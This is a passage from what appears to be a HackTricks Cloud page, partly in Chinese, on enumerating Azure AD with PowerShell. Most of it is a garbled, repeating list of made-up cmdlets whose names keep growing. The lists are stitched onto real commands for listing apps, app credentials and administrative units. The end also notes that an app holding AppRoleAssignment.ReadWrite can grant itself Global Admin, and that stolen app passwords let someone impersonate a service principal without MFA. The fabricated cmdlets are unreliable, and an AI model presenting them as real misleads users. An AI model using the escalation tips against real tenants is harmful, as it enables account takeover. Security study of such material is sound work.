To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hashes using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHash` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate thumbprint hashes in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHash
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Values

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashValue` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate thumbprint hash values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithm` cmdlet. This cmdlet retrieves the user flows policy key credential signature certificate thumbprint hash algorithm in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithm
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm Values

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmValue` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate thumbprint hash algorithm values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm OID

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm OID using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOID` cmdlet. This cmdlet retrieves the user flows policy key credential signature certificate thumbprint hash algorithm OID in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOID
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm OID Values

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm OID values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDValue` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate thumbprint hash algorithm OID values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm OID Name

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm OID name using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDName` cmdlet. This cmdlet retrieves the user flows policy key credential signature certificate thumbprint hash algorithm OID name in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDName
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm OID Name Values

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm OID name values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameValue` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate thumbprint hash algorithm OID name values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm OID Name Display Names

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm OID name display names using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayName` cmdlet. This cmdlet retrieves the user flows policy key credential signature certificate thumbprint hash algorithm OID name display names in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayName
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm OID Name Display Name Values

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm OID name display name values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayNameValue` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate thumbprint hash algorithm OID name display name values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayNameValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm OID Name Display Name Translations

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm OID name display name translations using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayNameTranslation` cmdlet. This cmdlet retrieves the user flows policy key credential signature certificate thumbprint hash algorithm OID name display name translations in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayNameTranslation
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm OID Name Display Name Translation Values

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm OID name display name translation values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayNameTranslationValue` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate thumbprint hash algorithm OID name display name translation values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayNameTranslationValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm OID Name Display Name Translation Language

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint hash algorithm OID name display name translation language using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayNameTranslationLanguage` cmdlet. This cmdlet retrieves the user flows policy key credential signature certificate thumbprint hash algorithm OID name display name translation language in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintHashAlgorithmOIDNameDisplayNameTranslationLanguage
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hash Algorithm
```powershell
# Get Apps
Get-AzADApplication
# Get details of one App
Get-AzADApplication -ObjectId <id>
# Get App searching by string
Get-AzADApplication | ?{$_.DisplayName -match "app"}
# Get Apps with password
Get-AzADAppCredential
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
具有**`AppRoleAssignment.ReadWrite`**权限的应用程序可以通过授予自身角色来**升级为全局管理员**。\
有关更多信息，请[**查看此链接**](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)。
{% endhint %}

{% hint style="info" %}
应用程序在请求令牌时用于证明其身份的秘密字符串是应用程序密码。\
因此，如果找到此**密码**，您可以作为**租户内的服务主体**访问。\
请注意，此密码仅在生成时可见（您可以更改它，但无法再次获取它）。\
**应用程序的所有者**可以为其**添加密码**（以便可以冒充它）。\
以这些服务主体的身份登录**不会被标记为风险**，并且它们**不会有多重身份验证**。
{% endhint %}

### 管理单元

它用于更好地管理用户。

管理单元**将角色的权限限制为您定义的组织的任何部分**。例如，您可以使用管理单元将[Helpdesk Administrator](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#helpdesk-administrator)角色委派给区域支持专员，以便他们仅能管理其支持的区域中的用户。

因此，您可以将角色分配给管理单元，并且其成员将具有这些角色。

{% tabs %}
{% tab title="az cli" %}
```
```
{% endtab %}

{% tab title="AzureAD" %}
```powershell
# Get Administrative Units
Get-AzureADMSAdministrativeUnit
Get-AzureADMSAdministrativeUnit -Id <id>
# Get ID of admin unit by string
$adminUnitObj = Get-AzureADMSAdministrativeUnit -Filter "displayname eq 'Test administrative unit 2'"
# List the users, groups, and devices affected by the administrative unit
Get-AzureADMSAdministrativeUnitMember -Id <id>
# Get the roles users have over the members of the AU
Get-AzureADMSScopedRoleMembership -Id <id> | fl #Get role ID and role members
```
{% endtab %}
{% endtabs %}

### 参考资料

* [https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units](https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units)

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>
